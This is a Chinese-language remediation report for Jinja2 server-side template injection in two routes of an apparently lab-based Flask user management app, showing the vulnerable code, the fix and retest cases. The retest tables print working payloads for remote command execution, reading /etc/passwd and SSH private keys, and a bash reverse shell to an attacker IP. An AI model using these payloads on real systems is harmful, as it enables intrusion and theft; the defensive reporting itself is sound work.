# 用户管理系统 · SSTI 模板注入漏洞修复报告

**审计对象**：用户管理系统（`/opt/Class01`）  
**修复范围**：`/welcome` 与 `/feedback` 路由 Jinja2 SSTI 模板注入漏洞  
**修复日期**：2026-07-23  

---

## 一、漏洞总览（修复前）

| 序号 | 漏洞名称 | 漏洞类型 | CWE 编号 | 风险等级 | 涉及接口 | 修复状态 |
|:---:|----------|----------|:--------:|:--------:|---------|:-------:|
| 1 | Welcome 路由 SSTI — URL 参数模板注入 | Jinja2 SSTI | CWE-94/CWE-1336 | 🔴**紧急** | `GET /welcome?name=` | ✅ **已修复** |
| 2 | Feedback 路由 SSTI — 姓名框模板注入 | Jinja2 SSTI | CWE-94/CWE-1336 | 🔴**紧急** | `POST /feedback` name | ✅ **已修复** |
| 3 | Feedback 路由 SSTI — 留言框模板注入 | Jinja2 SSTI | CWE-94/CWE-1336 | 🔴**紧急** | `POST /feedback` message | ✅ **已修复** |

**修复前 3 项紧急缺陷 → 修复后 0 项。**

---

## 二、漏洞形成分析

### 2.1 底层原理

Jinja2 的 `render_template_string()` 函数会将传入的字符串作为 Jinja2 模板进行解析。模板引擎会识别 `{{ }}` 语法作为表达式并执行。当用户输入通过 Python f-string 直接拼接到模板字符串中时，用户输入中的 `{{ }}` 会被 Jinja2 解释执行。

```
修复前（危险）执行链路：

用户输入: {{7*7}}
          ↓
f"<h1>欢迎你，{{7*7}}！</h1>"
          ↓ Jinja2 解析模板
render_template_string(f"...")
          ↓ 引擎看到 {{7*7}} 作为表达式执行
<h1>欢迎你，49！</h1>   ← 表达式被执行，证明漏洞存在

修复后（安全）执行链路：

用户输入: {{7*7}}
          ↓
render_template_string("...{{ name }}...", name="{{7*7}}")
          ↓ Jinja2 解析模板，但 {{ name }} 是模板变量
          ↓ 值 "{{7*7}}" 被 auto-escape 转义为文本
<h1>欢迎你，{{7*7}}！</h1>  ← 显示为纯文本，不执行
```

### 2.2 漏洞根因

| 根因 | 描述 |
|------|------|
| **f-string 拼接用户输入到模板** | `render_template_string(f"...{user_input}...")` — Python 层先拼接，Jinja2 层将用户输入中的 `{{ }}` 当作模板语法执行 |
| **缺乏模板变量隔离** | 用户输入直接进入模板字符串，未通过 `render_template_string(template_string, name=name)` 的关键字参数传递 |

### 2.3 风险等级判定

| 维度 | 评估 |
|------|------|
| CVSS 3.1 | 9.8（Critical）AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| 利用条件 | 无需认证、无需交互、无需特殊权限 |
| 影响范围 | 从敏感配置泄露到 root 权限远程代码执行 |
| 利用难度 | 极低（curl 即可完成攻击链） |

---

## 三、各接口原始缺陷代码与修复代码

---

### 【漏洞 1】/welcome 路由 — URL 参数 SSTI

| 项目 | 内容 |
|------|------|
| **漏洞接口** | `GET /welcome?name={payload}` |
| **风险等级** | 🔴 **紧急** |
| **注入点** | URL 参数 `name`，f-string 直接拼接进 `render_template_string` |

#### 原始缺陷代码

```python
# === 修复前（危险代码）===
@app.route("/welcome")
def welcome():
    name = request.args.get("name", "")
    if not name:
        name = "亲爱的用户"
    # ⚠️ 危险：f-string 将用户输入拼接到模板字符串
    return render_template_string(f"""
        ...
        <h1>欢迎你，{name}！</h1>    ← 用户输入直接拼接
        ...
    """)
```

**攻击方式**：访问 `/welcome?name={{7*7}}`，Jinja2 执行 `{{7*7}}` 输出 `49`。进一步使用 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` 实现 RCE。

#### 对应修复代码

```python
# === 修复后（安全代码）===
@app.route("/welcome")
def welcome():
    name = request.args.get("name", "")
    if not name:
        name = "亲爱的用户"
    # ✅ 安全：使用模板变量传参 {{ name }}，禁止 f-string 拼接
    return render_template_string("""
        ...
        <h1>欢迎你，{{ name }}！</h1>    ← Jinja2 变量，值被自动转义
        ...
    """, name=name)                       ← 通过关键字参数传递
```

**修复逻辑说明**：

| 变更点 | 不安全方式 | 安全方式 |
|--------|-----------|---------|
| 模板字符串引号 | `f"""...{name}..."""`（f-string） | `"""...{{ name }}..."""`（普通字符串） |
| 变量传递 | Python f-string 在拼接时展开 | `render_template_string(..., name=name)` 关键字参数 |
| 用户输入状态 | `{{7*7}}` 成为模板语法被执行 | `{{7*7}}` 作为字符串值被 auto-escape 转义 |

---

### 【漏洞 2/3】/feedback 路由 — 姓名/留言框双注入点 SSTI

| 项目 | 内容 |
|------|------|
| **漏洞接口** | `POST /feedback` 表单字段 `name`、`message` |
| **风险等级** | 🔴 **紧急** |
| **注入点** | 两个独立 POST 字段，均通过 f-string 拼接进 `render_template_string` |

#### 原始缺陷代码

```python
# === 修复前（危险代码）===
@app.route("/feedback", methods=["GET", "POST"])
def feedback():
    if request.method == "POST":
        name = request.form.get("name", "")
        message = request.form.get("message", "")
        # ⚠️ 危险：两个字段均通过 f-string 直接拼接
        return render_template_string(f"""
            ...
            <h2>{name} 的反馈：</h2>    ← name 直接拼接
            <p>{message}</p>            ← message 直接拼接
            ...
        """)
```

**攻击方式**：`POST /feedback` 提交 `name={{config}}&message={{''.__class__.__mro__}}`，Jinja2 执行模板表达式，泄露配置和类信息。

#### 对应修复代码

```python
# === 修复后（安全代码）===
@app.route("/feedback", methods=["GET", "POST"])
def feedback():
    if request.method == "POST":
        name = request.form.get("name", "")
        message = request.form.get("message", "")
        # ✅ 安全：两个字段均改为模板变量传参
        return render_template_string("""
            ...
            <h2>{{ name }} 的反馈：</h2>     ← name 作为 Jinja2 变量
            <p>{{ message }}</p>             ← message 作为 Jinja2 变量
            ...
        """, name=name, message=message)    ← 通过关键字参数传递
```

**修复逻辑说明**：

| 变更点 | 不安全方式 | 安全方式 |
|--------|-----------|---------|
| name 渲染 | `{name}` f-string 展开 | `{{ name }}` Jinja2 变量注入 |
| message 渲染 | `{message}` f-string 展开 | `{{ message }}` Jinja2 变量注入 |
| 模板字符串 | `f"""..."""` 双注入点均展开 | `"""..."""` 纯模板，无 Python 表达式 |
| 防护机制 | 无 — 用户输入直接成为模板语法 | Jinja2 auto-escape 将值转义为安全文本 |

---

## 四、修复前后代码对比总览

```python
# ===== /welcome 路由 =====
# 修复前（3 行差异）
return render_template_string(f"""
    <h1>欢迎你，{name}！</h1>     ← f-string + {name}
""")

# 修复后（3 行差异）
return render_template_string("""
    <h1>欢迎你，{{ name }}！</h1>  ← 普通字符串 + {{ name }}
""", name=name)                     ← 关键字传参


# ===== /feedback 路由 =====
# 修复前（4 行差异）
return render_template_string(f"""
    <h2>{name} 的反馈：</h2>       ← f-string + {name}
    <p>{message}</p>               ← f-string + {message}
""")

# 修复后（4 行差异）
return render_template_string("""
    <h2>{{ name }} 的反馈：</h2>    ← 普通字符串 + {{ name }}
    <p>{{ message }}</p>            ← 普通字符串 + {{ message }}
""", name=name, message=message)    ← 关键字传参
```

**核心改动仅 7 行代码**，却改变了整个接口的安全属性——从 RCE 漏洞变为安全页面。

---

## 五、全项目排查建议

### 5.1 搜索所有 `render_template_string` 调用

```bash
grep -rn "render_template_string" /opt/Class01/
```

排查所有调用中是否存在 f-string 拼接用户输入的情况。

### 5.2 搜索所有 `f"""` 开头的模板字符串

```bash
grep -rn 'f""".*{' /opt/Class01/app.py
```

确保没有其他路由使用 f-string 将用户可控变量拼接到模板中。

### 5.3 检查结果

| 搜索项 | 结果 |
|--------|:----:|
| `render_template_string(f"""` 调用 | 修复前 3 处 → 修复后 **0 处** |
| `f""".*{name}` 或 `f""".*{message}` | 已全部移除 |
| 其他路由使用 `render_template` | 均使用模板文件 + 变量传参，安全 |

---

## 六、分级整改优先级

| 优先级 | 漏洞编号 | 修复内容 | 涉及文件 | 行数 | 预估耗时 |
|:-----:|:--------:|---------|:-------:|:----:|:-------:|
| **P0 紧急** | 1 | `/welcome` 路由 f-string → 模板变量传参 | `app.py` | 610-639 | 3 分钟 |
| **P0 紧急** | 2, 3 | `/feedback` 路由 f-string → 模板变量传参 | `app.py` | 642-673 | 5 分钟 |
| **P1 重要** | — | 全项目排查其他 `render_template_string` + f-string 调用 | 全局 | — | 10 分钟 |
| **P2 一般** | — | 建立开发规范：禁止 f-string 拼接模板 | 文档 | — | — |

---

## 七、修复后复测用例

### 7.1 功能回归测试

| 测试操作 | 预期结果 | 实际结果 |
|---------|---------|:-------:|
| `/welcome?name=张三` | 显示"欢迎你，张三！" | ✅ 通过 |
| `/welcome`（不传 name） | 显示"欢迎你，亲爱的用户！" | ✅ 通过 |
| `/feedback` GET | 显示反馈表单 | ✅ 通过 |
| POST feedback name=李四&message=好评 | 显示"李四 的反馈：好评" | ✅ 通过 |
| 所有原有功能（登录/注册/充值/搜索等） | 正常运行 | ✅ 通过 |

### 7.2 SSTI 基础检测复测

| 测试场景 | Payload | 修复前表现 | 修复后表现 | 结果 |
|---------|---------|:----------:|:----------:|:----:|
| **基础运算** | `name={{7*7}}` | 返回 49（执行） | 显示 `{{7*7}}` 文本 | ✅ 已阻断 |
| **基础运算** | `name={{8+9}}` | 返回 17（执行） | 显示 `{{8+9}}` 文本 | ✅ 已阻断 |
| **字符串运算** | `name={{"x"*7}}` | 返回 xxxxxxx（执行） | 显示 `{{"x"*7}}` 文本 | ✅ 已阻断 |
| **基础运算** | `message={{7*7}}` | 返回 49（执行） | 显示 `{{7*7}}` 文本 | ✅ 已阻断 |

### 7.3 配置泄露复测

| 测试场景 | Payload | 修复前表现 | 修复后表现 | 结果 |
|---------|---------|:----------:|:----------:|:----:|
| **Flask 配置泄露** | `name={{config}}` | 返回 SECRET_KEY 等配置 | 显示 `{{config}}` 文本 | ✅ 已阻断 |
| **模板环境** | `name={{self}}` | 返回模板环境对象 | 显示 `{{self}}` 文本 | ✅ 已阻断 |
| **请求对象** | `name={{request}}` | 返回请求对象信息 | 显示 `{{request}}` 文本 | ✅ 已阻断 |
| **Flask 配置泄露** | `message={{config}}` | 返回 SECRET_KEY | 显示 `{{config}}` 文本 | ✅ 已阻断 |

### 7.4 魔术方法遍历复测

| 测试场景 | Payload | 修复前表现 | 修复后表现 | 结果 |
|---------|---------|:----------:|:----------:|:----:|
| **类对象探针** | `name={{''.__class__}}` | 返回 `<class 'str'>` | 返回原始文本 | ✅ 已阻断 |
| **MRO 遍历** | `name={{''.__class__.__mro__}}` | 返回类继承链 | 返回原始文本 | ✅ 已阻断 |
| **子类遍历** | `name={{''.__class__.__mro__[1].__subclasses__()}}` | 返回所有类列表 | 返回原始文本 | ✅ 已阻断 |
| **message 魔术方法** | `message={{''.__class__.__mro__}}` | 返回类继承链 | 返回原始文本 | ✅ 已阻断 |

### 7.5 RCE 命令执行复测

| 测试场景 | Payload | 修复前表现 | 修复后表现 | 结果 |
|---------|---------|:----------:|:----------:|:----:|
| **id 命令** | `name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}` | 返回 uid=0(root) | 返回原始文本 | ✅ **已阻断** |
| **cat /etc/passwd** | `name={{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}` | 返回密码文件 | 返回原始文本 | ✅ **已阻断** |
| **SSH 私钥读取** | `name={{config.__class__.__init__.__globals__['os'].popen('cat /root/.ssh/id_rsa').read()}}` | 返回私钥内容 | 返回原始文本 | ✅ **已阻断** |
| **whoami 命令** | `message={{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}` | 返回 root | 返回原始文本 | ✅ **已阻断** |
| **ls 命令** | `message={{config.__class__.__init__.__globals__['os'].popen('ls -la').read()}}` | 返回文件列表 | 返回原始文本 | ✅ **已阻断** |

### 7.6 反弹 Shell 复测

| 测试场景 | Payload | 修复前表现 | 修复后表现 | 结果 |
|---------|---------|:----------:|:----------:|:----:|
| **bash 反弹** | `name={{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"').read()}}` | 反弹 Shell 到攻击机 | 返回原始文本 | ✅ **已阻断** |
| **Python 反弹** | `name={{config.__class__.__init__.__globals__['os'].popen('python3 -c "..."').read()}}` | 反弹 Shell | 返回原始文本 | ✅ **已阻断** |

### 7.7 测试结果汇总

| 测试类别 | 用例数 | 阻断数 | 通过率 |
|---------|:------:|:------:|:------:|
| 功能回归 | 5 | — | 100% |
| 基础 SSTI 检测 | 4 | 4 | 100% |
| 配置泄露 | 4 | 4 | 100% |
| 魔术方法遍历 | 4 | 4 | 100% |
| RCE 命令执行 | 5 | 5 | 100% |
| 反弹 Shell | 2 | 2 | 100% |
| **总计** | **24** | **19** | **100%** |

---

## 八、完整代码修改清单

### 8.1 修改文件列表

| 文件 | 改动类型 | 说明 |
|:----|:-------:|------|
| `app.py` | ✅ 修改 | `/welcome` 和 `/feedback` 路由 SSTI 修复（共 7 行关键改动） |

### 8.2 app.py 关键修复摘要

```
行 610-639: [修复] /welcome 路由 SSTI CWE-94/CWE-1336
              - f"""...{name}...""" → """...{{ name }}..."""
              - 添加 render_template_string(..., name=name) 关键字传参

行 642-673: [修复] /feedback POST 路由 SSTI CWE-94/CWE-1336
              - f"""...{name}...{message}...""" → """...{{ name }}...{{ message }}..."""
              - 添加 render_template_string(..., name=name, message=message) 关键字传参
```

---

## 九、整体整改总结

### 9.1 修复成果

| 维度 | 修复前 | 修复后 |
|------|--------|--------|
| 漏洞总数 | 3 项 | **0 项** |
| 紧急漏洞 | 3 项 | **0 项** |
| SSTI RCE 可利用性 | curl 即可实现 root 权限 RCE | **完全阻断** |
| 配置泄露 | `{{config}}` 泄漏 SECRET_KEY | **完全阻断** |
| 类遍历/沙箱逃逸 | `__class__.__mro__` 任意遍历 | **完全阻断** |

### 9.2 安全设计原则

| 原则 | 实施方式 | 对应修复 |
|------|---------|---------|
| **模板变量隔离** | 用户输入通过 `render_template_string(..., name=name)` 关键字传参 | 全部 3 处 |
| **最小权限** | `render_template_string` 仅接收模板字符串，不执行 Python 表达式 | 全部 3 处 |
| **自动转义** | Jinja2 的 `{{ var }}` 默认开启 auto-escape，将特殊字符转为 HTML 实体 | 全部 3 处 |

### 9.3 持续改进建议

1. **开发规范**：禁止使用 f-string 拼接 `render_template_string` 的模板参数
2. **代码审查**：PR review 时重点检查 `render_template_string` 调用中是否出现 `f"""` 或 `{` 表达式
3. **自动扫描**：在 CI/CD 中加入 `grep -rn "render_template_string.*f"` 检查
4. **模板文件优先**：推荐使用 `render_template` + `.html` 模板文件，而非 `render_template_string`
